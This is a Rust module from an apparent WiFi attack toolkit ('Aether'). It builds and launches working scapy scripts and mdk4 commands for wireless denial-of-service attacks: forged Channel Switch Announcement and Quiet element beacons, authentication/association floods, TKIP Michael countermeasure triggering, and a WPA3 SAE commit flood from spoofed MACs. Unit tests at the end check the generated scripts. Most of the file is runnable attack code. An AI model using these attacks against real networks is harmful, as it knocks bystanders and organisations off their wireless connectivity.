//! Advanced WiFi attack modules wrapping mdk4 and scapy.
//!
//! Implements attacks beyond the basic beacon/deauth/probe set:
//! - Channel Switch Announcement (CSA) injection
//! - Association / Sleep attack
//! - Quiet Time element injection
//! - Bad Message (Michael countermeasure exploitation)
//! - SAE Commit Flood (WPA3)
//!
//! Design: reuses `AttackHandle` from `attack_engine` and delegates
//! to mdk4 where possible, falling back to scapy Python scripts
//! for custom IE injection.

use log::info;
use std::fs;
use std::io::{BufRead, BufReader};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

use super::attack_engine::AttackHandle;
use crate::error::AetherError;

// ─────────────────────────────────────────────────
// Scapy helper
// ─────────────────────────────────────────────────

/// Write a Python/scapy script to a temp file and execute it,
/// returning an `AttackHandle` that wraps the child process.
fn run_scapy_attack(script: &str, label: &str) -> Result<AttackHandle, AetherError> {
    let path = format!(
        "/tmp/aether_attack_{}-{}.py",
        label,
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis()
    );

    fs::write(&path, script).map_err(|e| {
        AetherError::CaptureError(format!("Failed to write scapy script: {}", e))
    })?;

    info!("Starting scapy attack [{}]: python3 {}", label, path);

    let stop_flag = Arc::new(AtomicBool::new(false));
    let stop_clone = stop_flag.clone();
    let label_owned = label.to_string();

    let mut child = Command::new("python3")
        .arg(&path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| {
            AetherError::CaptureError(format!("Failed to start scapy script: {}", e))
        })?;

    let stderr = child.stderr.take();
    let thread = std::thread::Builder::new()
        .name(format!("aether-scapy-{}", label_owned))
        .spawn(move || {
            if let Some(stderr) = stderr {
                let reader = BufReader::new(stderr);
                for line in reader.lines() {
                    if stop_clone.load(Ordering::Relaxed) {
                        break;
                    }
                    match line {
                        Ok(l) => info!("[scapy/{}] {}", label_owned, l),
                        Err(_) => break,
                    }
                }
            }
        })
        .ok();

    Ok(AttackHandle {
        stop_flag,
        child: Some(child),
        thread,
        temp_files: vec![path],
    })
}

/// Spawn an mdk4 process and return an `AttackHandle`.
fn spawn_mdk4(
    args: Vec<String>,
    temp_files: Vec<String>,
    label: &str,
) -> Result<AttackHandle, AetherError> {
    info!(
        "Starting mdk4 attack [{}]: mdk4 {}",
        label,
        args.join(" ")
    );

    let stop_flag = Arc::new(AtomicBool::new(false));
    let stop_clone = stop_flag.clone();
    let label = label.to_string();

    let mut child = Command::new("mdk4")
        .args(&args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| {
            AetherError::CaptureError(format!("Failed to start mdk4: {}. Is mdk4 installed?", e))
        })?;

    let stderr = child.stderr.take();
    let thread = std::thread::Builder::new()
        .name(format!("aether-mdk4-adv-{}", label))
        .spawn(move || {
            if let Some(stderr) = stderr {
                let reader = BufReader::new(stderr);
                for line in reader.lines() {
                    if stop_clone.load(Ordering::Relaxed) {
                        break;
                    }
                    match line {
                        Ok(l) => info!("[mdk4/{}] {}", label, l),
                        Err(_) => break,
                    }
                }
            }
        })
        .ok();

    Ok(AttackHandle {
        stop_flag,
        child: Some(child),
        thread,
        temp_files,
    })
}

// ─────────────────────────────────────────────────
// A. Channel Switch Attack (CSA)
// ─────────────────────────────────────────────────

/// Generate a scapy script that injects beacon frames carrying
/// a Channel Switch Announcement IE (Element ID 37).
pub fn build_csa_script(interface: &str, target_bssid: &str, target_channel: u8) -> String {
    format!(
        r#"#!/usr/bin/env python3
"""Aether – Channel Switch Announcement injection via scapy."""
import signal, sys
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp

running = True
def _stop(sig, frame):
    global running
    running = False
signal.signal(signal.SIGTERM, _stop)
signal.signal(signal.SIGINT, _stop)

IFACE   = "{iface}"
BSSID   = "{bssid}"
NEW_CH  = {channel}

# Channel Switch Announcement IE: Element ID 37, length 3
# mode=1 (clients must stop transmitting), new channel, count=3
csa_ie = bytes([37, 3, 1, NEW_CH, 3])

dot11  = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
               addr2=BSSID, addr3=BSSID)
beacon = Dot11Beacon(cap="ESS")
essid  = Dot11Elt(ID="SSID", info="")
dsset  = Dot11Elt(ID="DSset", info=chr(NEW_CH))
csa_el = Dot11Elt(ID=37, info=bytes([1, NEW_CH, 3]))

pkt = RadioTap() / dot11 / beacon / essid / dsset / csa_el

print(f"[CSA] Injecting CSA beacons  BSSID={{BSSID}}  new_ch={{NEW_CH}}")
while running:
    sendp(pkt, iface=IFACE, count=10, inter=0.05, verbose=False)
print("[CSA] Stopped.")
"#,
        iface = interface,
        bssid = target_bssid,
        channel = target_channel,
    )
}

/// Start a Channel Switch Announcement attack.
///
/// Injects forged beacon frames with CSA IE to trick clients into
/// switching to a different channel, effectively disrupting connectivity.
pub fn start_channel_switch(
    interface: &str,
    target_bssid: &str,
    target_channel: u8,
) -> Result<AttackHandle, AetherError> {
    let script = build_csa_script(interface, target_bssid, target_channel);
    run_scapy_attack(&script, "csa")
}

// ─────────────────────────────────────────────────
// B. Association / Sleep Attack
// ─────────────────────────────────────────────────

/// Start an association/sleep attack using mdk4 mode `a` (Authentication DoS).
///
/// Floods the target AP with authentication and association frames,
/// exhausting its client table and causing denial-of-service.
/// If `target_bssid` is provided, attacks only that AP.
pub fn start_sleep_attack(
    interface: &str,
    target_bssid: Option<&str>,
    target_mac: Option<&str>,
) -> Result<AttackHandle, AetherError> {
    let mut args = vec![interface.to_string(), "a".to_string()];
    let mut temp_files = Vec::new();

    if let Some(bssid) = target_bssid {
        // Write the target to a file for mdk4's -a (AP target) flag
        let path = write_temp("aether-sleep-target", &format!("{}\n", bssid))?;
        args.push("-a".to_string());
        args.push(path.clone());
        temp_files.push(path);
    }

    if let Some(mac) = target_mac {
        // -c targets a specific client station
        let path = write_temp("aether-sleep-client", &format!("{}\n", mac))?;
        args.push("-c".to_string());
        args.push(path.clone());
        temp_files.push(path);
    }

    spawn_mdk4(args, temp_files, "sleep-auth-dos")
}

// ─────────────────────────────────────────────────
// C. Quiet Time Attack
// ─────────────────────────────────────────────────

/// Generate a scapy script that injects beacon frames carrying
/// a Quiet Element IE (Element ID 40).
pub fn build_quiet_script(interface: &str, channel: u8, duration_ms: u16) -> String {
    format!(
        r#"#!/usr/bin/env python3
"""Aether – Quiet Element IE injection via scapy."""
import signal, sys, struct
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp

running = True
def _stop(sig, frame):
    global running
    running = False
signal.signal(signal.SIGTERM, _stop)
signal.signal(signal.SIGINT, _stop)

IFACE       = "{iface}"
CHANNEL     = {channel}
DURATION_TU = {duration}   # in TUs (1 TU ≈ 1024 µs)

# Quiet Element IE: ID 40, length 6
# quiet_count=1, quiet_period=1, quiet_duration (2 bytes LE), quiet_offset=0 (2 bytes LE)
quiet_body = struct.pack("<BBHH", 1, 1, DURATION_TU, 0)

dot11  = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
               addr2="de:ad:be:ef:00:01", addr3="de:ad:be:ef:00:01")
beacon = Dot11Beacon(cap="ESS")
essid  = Dot11Elt(ID="SSID", info="")
dsset  = Dot11Elt(ID="DSset", info=chr(CHANNEL))
quiet  = Dot11Elt(ID=40, info=quiet_body)

pkt = RadioTap() / dot11 / beacon / essid / dsset / quiet

print(f"[Quiet] Injecting Quiet IE  ch={{CHANNEL}}  dur={{DURATION_TU}} TU")
while running:
    sendp(pkt, iface=IFACE, count=10, inter=0.05, verbose=False)
print("[Quiet] Stopped.")
"#,
        iface = interface,
        channel = channel,
        duration = duration_ms,
    )
}

/// Start a Quiet Time attack.
///
/// Injects forged beacon frames containing the Quiet Element IE,
/// instructing compliant clients to cease transmissions for a
/// specified duration.
pub fn start_quiet_time(
    interface: &str,
    channel: u8,
    duration_ms: u16,
) -> Result<AttackHandle, AetherError> {
    let script = build_quiet_script(interface, channel, duration_ms);
    run_scapy_attack(&script, "quiet")
}

// ─────────────────────────────────────────────────
// D. Bad Message Attack (Michael Countermeasure)
// ─────────────────────────────────────────────────

/// Start a bad-message attack using mdk4 mode `m` (Michael countermeasure).
///
/// Exploits the TKIP Michael MIC weakness: if two MIC failures occur
/// within 60 seconds the AP shuts down the network for one minute.
/// Only effective against WPA-TKIP networks.
pub fn start_bad_message(
    interface: &str,
    target_bssid: &str,
) -> Result<AttackHandle, AetherError> {
    let mut args = vec![interface.to_string(), "m".to_string()];
    let mut temp_files = Vec::new();

    // Target a specific BSSID
    let path = write_temp("aether-michael-target", &format!("{}\n", target_bssid))?;
    args.push("-t".to_string());
    args.push(path.clone());
    temp_files.push(path);

    spawn_mdk4(args, temp_files, "bad-message-michael")
}

// ─────────────────────────────────────────────────
// E. SAE Commit Flood (WPA3)
// ─────────────────────────────────────────────────

/// Generate a scapy script that floods an AP with SAE Authentication
/// (commit) frames, overwhelming WPA3 processing.
pub fn build_sae_flood_script(interface: &str, target_bssid: &str) -> String {
    format!(
        r#"#!/usr/bin/env python3
"""Aether – SAE Commit Flood via scapy (targets WPA3 APs)."""
import signal, sys, os, struct
from scapy.all import RadioTap, Dot11, Dot11Auth, sendp, RandMAC

running = True
def _stop(sig, frame):
    global running
    running = False
signal.signal(signal.SIGTERM, _stop)
signal.signal(signal.SIGINT, _stop)

IFACE = "{iface}"
BSSID = "{bssid}"

# SAE Authentication: algo=3 (SAE), seq=1 (commit), status=0
# Followed by a minimal SAE commit body (group id + scalar + element)
SAE_ALGO = 3
SAE_SEQ  = 1

print(f"[SAE-Flood] Flooding {{BSSID}} with SAE commit frames on {{IFACE}}")
while running:
    src = str(RandMAC())
    dot11 = Dot11(type=0, subtype=11,
                  addr1=BSSID, addr2=src, addr3=BSSID)
    auth  = Dot11Auth(algo=SAE_ALGO, seqnum=SAE_SEQ, status=0)
    # Append minimal SAE commit body: finite cyclic group = 19 (ECC P-256)
    sae_body = struct.pack("<H", 19) + os.urandom(64)
    pkt = RadioTap() / dot11 / auth / sae_body
    sendp(pkt, iface=IFACE, count=20, inter=0.01, verbose=False)

print("[SAE-Flood] Stopped.")
"#,
        iface = interface,
        bssid = target_bssid,
    )
}

/// Start an SAE Commit Flood attack against a WPA3 AP.
///
/// Sends spoofed SAE Authentication (commit) frames from random MACs,
/// forcing the AP to perform expensive elliptic-curve operations.
pub fn start_sae_flood(
    interface: &str,
    target_bssid: &str,
) -> Result<AttackHandle, AetherError> {
    let script = build_sae_flood_script(interface, target_bssid);
    run_scapy_attack(&script, "sae-flood")
}

// ─────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────

fn write_temp(prefix: &str, content: &str) -> Result<String, AetherError> {
    let path = format!(
        "/tmp/{}-{}.txt",
        prefix,
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis()
    );
    fs::write(&path, content).map_err(|e| {
        AetherError::CaptureError(format!("Failed to write temp file: {}", e))
    })?;
    Ok(path)
}

// ─────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // -- Script generation tests ----------------------------------

    #[test]
    fn csa_script_contains_target_bssid_and_channel() {
        let script = build_csa_script("wlan0mon", "AA:BB:CC:DD:EE:FF", 6);
        assert!(script.contains("AA:BB:CC:DD:EE:FF"));
        assert!(script.contains("NEW_CH  = 6"));
        assert!(script.contains("wlan0mon"));
        assert!(script.contains("Dot11Beacon"));
        assert!(script.contains("ID=37"));
    }

    #[test]
    fn quiet_script_contains_channel_and_duration() {
        let script = build_quiet_script("wlan1mon", 11, 500);
        assert!(script.contains("wlan1mon"));
        assert!(script.contains("CHANNEL     = 11"));
        assert!(script.contains("DURATION_TU = 500"));
        assert!(script.contains("ID=40"));
    }

    #[test]
    fn sae_flood_script_contains_bssid() {
        let script = build_sae_flood_script("wlan0mon", "11:22:33:44:55:66");
        assert!(script.contains("11:22:33:44:55:66"));
        assert!(script.contains("SAE_ALGO = 3"));
        assert!(script.contains("Dot11Auth"));
        assert!(script.contains("RandMAC"));
    }

    #[test]
    fn csa_script_is_valid_python_syntax() {
        let script = build_csa_script("wlan0mon", "AA:BB:CC:DD:EE:FF", 1);
        // Must start with shebang and contain proper python
        assert!(script.starts_with("#!/usr/bin/env python3"));
        assert!(script.contains("import signal"));
        assert!(script.contains("from scapy.all import"));
        assert!(script.contains("sendp("));
    }

    #[test]
    fn quiet_script_is_valid_python_syntax() {
        let script = build_quiet_script("wlan0mon", 6, 100);
        assert!(script.starts_with("#!/usr/bin/env python3"));
        assert!(script.contains("struct.pack"));
        assert!(script.contains("sendp("));
    }

    #[test]
    fn sae_flood_script_is_valid_python_syntax() {
        let script = build_sae_flood_script("wlan0", "00:11:22:33:44:55");
        assert!(script.starts_with("#!/usr/bin/env python3"));
        assert!(script.contains("os.urandom"));
        assert!(script.contains("sendp("));
    }

    // -- mdk4 argument construction tests -------------------------

    #[test]
    fn sleep_attack_constructs_mdk4_mode_a() {
        // We can't actually spawn mdk4 in tests, but we verify the
        // temp-file logic and that start_sleep_attack returns an
        // error (mdk4 not available in test env) with the right message.
        let result = start_sleep_attack("wlan0mon", Some("AA:BB:CC:DD:EE:FF"), None);
        // In CI / test environments mdk4 won't be available — that's fine,
        // the error should reference mdk4.
        match result {
            Err(AetherError::CaptureError(msg)) => {
                assert!(
                    msg.contains("mdk4") || msg.contains("No such file"),
                    "unexpected error: {}",
                    msg
                );
            }
            Ok(mut h) => h.stop(), // unlikely in tests, but clean up
            _ => panic!("unexpected result variant"),
        }
    }

    #[test]
    fn bad_message_constructs_mdk4_mode_m() {
        let result = start_bad_message("wlan0mon", "11:22:33:44:55:66");
        match result {
            Err(AetherError::CaptureError(msg)) => {
                assert!(
                    msg.contains("mdk4") || msg.contains("No such file"),
                    "unexpected error: {}",
                    msg
                );
            }
            Ok(mut h) => h.stop(),
            _ => panic!("unexpected result variant"),
        }
    }

    // -- AttackHandle cleanup test --------------------------------

    #[test]
    fn attack_handle_cleans_temp_files() {
        let path = write_temp("adv-test-cleanup", "data").unwrap();
        assert!(std::path::Path::new(&path).exists());

        let mut handle = AttackHandle {
            stop_flag: Arc::new(AtomicBool::new(false)),
            child: None,
            thread: None,
            temp_files: vec![path.clone()],
        };
        handle.stop();
        assert!(!std::path::Path::new(&path).exists());
    }

    // -- Write temp helper ----------------------------------------

    #[test]
    fn write_temp_creates_file_with_content() {
        let path = write_temp("adv-test-write", "hello\n").unwrap();
        let content = fs::read_to_string(&path).unwrap();
        assert_eq!(content, "hello\n");
        fs::remove_file(&path).unwrap();
    }
}
